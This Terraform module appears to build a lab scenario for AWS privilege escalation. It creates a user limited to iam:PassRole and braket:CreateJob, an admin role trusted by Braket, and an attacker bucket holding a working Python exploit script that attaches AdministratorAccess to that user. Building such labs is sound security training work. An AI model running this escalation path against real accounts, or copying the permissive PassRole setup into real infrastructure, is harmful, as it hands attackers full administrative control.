terraform {
  required_providers {
    aws = {
      source                = "hashicorp/aws"
      version               = "~> 6.0"
      configuration_aliases = [aws.prod, aws.attacker]
    }
  }
}

# Braket CreateJob privilege escalation scenario
#
# This scenario demonstrates how a user with iam:PassRole and braket:CreateJob
# can escalate privileges by creating a Braket Hybrid Job that runs a malicious
# Python script with an admin execution role. The script attaches AdministratorAccess
# to the starting user, granting full admin access.

# Resource naming convention: pl-prod-braket-001-to-admin-{resource-type}
# Provider: aws.prod for prod resources, aws.attacker for attacker-controlled resources

# Scenario-specific starting user
resource "aws_iam_user" "starting_user" {
  provider = aws.prod
  name     = "pl-prod-braket-001-to-admin-starting-user"

  tags = {
    Name        = "pl-prod-braket-001-to-admin-starting-user"
    Environment = var.environment
    Scenario    = "iam-passrole+braket-createjob"
    Purpose     = "starting-user"
  }
}

# Create access keys for the starting user
resource "aws_iam_access_key" "starting_user_key" {
  provider = aws.prod
  user     = aws_iam_user.starting_user.name
}

# Policy for the starting user - only permissions required for the exploit
resource "aws_iam_user_policy" "starting_user_policy" {
  provider = aws.prod
  name     = "pl-prod-braket-001-to-admin-starting-user-policy"
  user     = aws_iam_user.starting_user.name

  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Sid    = "RequiredForExploitationPassRole"
        Effect = "Allow"
        Action = [
          "iam:PassRole"
        ]
        Resource = aws_iam_role.admin_role.arn
      },
      {
        Sid    = "RequiredForExploitationBraketCreateJob"
        Effect = "Allow"
        Action = [
          "braket:CreateJob"
        ]
        Resource = "*"
      }
    ]
  })
}

# Admin role (target of privilege escalation)
# This role is passed to the Braket Hybrid Job as the execution role.
# The Braket job container receives credentials for this role, allowing
# the malicious script to perform admin-level actions.
resource "aws_iam_role" "admin_role" {
  provider = aws.prod
  name     = "pl-prod-braket-001-to-admin-admin-role"

  assume_role_policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Effect = "Allow"
        Principal = {
          Service = "braket.amazonaws.com"
        }
        Action = "sts:AssumeRole"
      }
    ]
  })

  tags = {
    Name        = "pl-prod-braket-001-to-admin-admin-role"
    Environment = var.environment
    Scenario    = "iam-passrole+braket-createjob"
    Purpose     = "admin-target"
  }
}

# Attach administrator access to the admin role
resource "aws_iam_role_policy_attachment" "admin_role_admin_access" {
  provider   = aws.prod
  role       = aws_iam_role.admin_role.name
  policy_arn = "arn:aws:iam::aws:policy/AdministratorAccess"
}

# S3 bucket for Braket job scripts and output (attacker-controlled)
# MUST start with "amazon-braket-" prefix because the default Braket execution
# policy restricts S3 access to arn:aws:s3:::amazon-braket-*
resource "aws_s3_bucket" "braket_bucket" {
  provider = aws.attacker
  bucket   = "amazon-braket-pl-prod-braket-001-${var.attacker_account_id}-${var.resource_suffix}"

  tags = {
    Name        = "amazon-braket-pl-prod-braket-001"
    Environment = var.environment
    Scenario    = "iam-passrole+braket-createjob"
    Purpose     = "braket-job-bucket"
  }
}

# Block public access on the Braket bucket
resource "aws_s3_bucket_public_access_block" "braket_bucket" {
  provider = aws.attacker
  bucket   = aws_s3_bucket.braket_bucket.id

  block_public_acls       = true
  block_public_policy     = true
  ignore_public_acls      = true
  restrict_public_buckets = true
}

# Bucket policy granting read access to all principals in the prod account
# This simulates an attacker-controlled bucket that grants access to specific accounts
resource "aws_s3_bucket_policy" "braket_bucket_policy" {
  provider = aws.attacker
  bucket   = aws_s3_bucket.braket_bucket.id

  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Sid    = "AllowProdAccountObjectAccess"
        Effect = "Allow"
        Principal = {
          AWS = "arn:aws:iam::${var.account_id}:root"
        }
        Action = [
          "s3:GetObject",
          "s3:PutObject"
        ]
        Resource = "${aws_s3_bucket.braket_bucket.arn}/*"
      },
      {
        Sid    = "AllowProdAccountListBucket"
        Effect = "Allow"
        Principal = {
          AWS = "arn:aws:iam::${var.account_id}:root"
        }
        Action = [
          "s3:ListBucket"
        ]
        Resource = aws_s3_bucket.braket_bucket.arn
      }
    ]
  })
}

# Pre-stage the malicious exploit script in S3
# In a real attack, the attacker would host this on their own infrastructure.
# The script runs inside the Braket Hybrid Job container with the admin role's credentials
# and attaches AdministratorAccess to the starting user.
resource "aws_s3_object" "exploit_script" {
  provider = aws.attacker
  bucket   = aws_s3_bucket.braket_bucket.id
  key      = "exploit/exploit.py"
  content  = <<-EOT
import boto3
import json
import os

def main():
    """
    Malicious Braket Hybrid Job entry point.
    This script runs with the privileged execution role attached to the Braket job.
    It attaches AdministratorAccess to the attacker's IAM user.
    """
    sts = boto3.client("sts")
    identity = sts.get_caller_identity()
    print(f"Running as: {identity['Arn']}")

    # Braket passes hyperparameters via AMZN_BRAKET_HP_FILE, not as env vars directly
    hp_file = os.environ.get("AMZN_BRAKET_HP_FILE", "")
    attacker_username = None
    if hp_file and os.path.exists(hp_file):
        with open(hp_file, "r") as f:
            hyperparams = json.load(f)
        attacker_username = hyperparams.get("ATTACKER_USER")
        print(f"Loaded hyperparameters from {hp_file}")

    if not attacker_username:
        # Fall back to hardcoded username
        attacker_username = "${aws_iam_user.starting_user.name}"

    iam = boto3.client("iam")
    policy_arn = "arn:aws:iam::aws:policy/AdministratorAccess"

    try:
        iam.attach_user_policy(
            UserName=attacker_username,
            PolicyArn=policy_arn
        )
        print(f"SUCCESS: Attached AdministratorAccess to {attacker_username}")
    except Exception as e:
        print(f"ERROR: Failed to attach policy: {e}")
        raise

if __name__ == "__main__":
    main()
EOT

  tags = {
    Name        = "exploit-script"
    Environment = var.environment
    Scenario    = "iam-passrole+braket-createjob"
    Purpose     = "attack-script"
  }
}
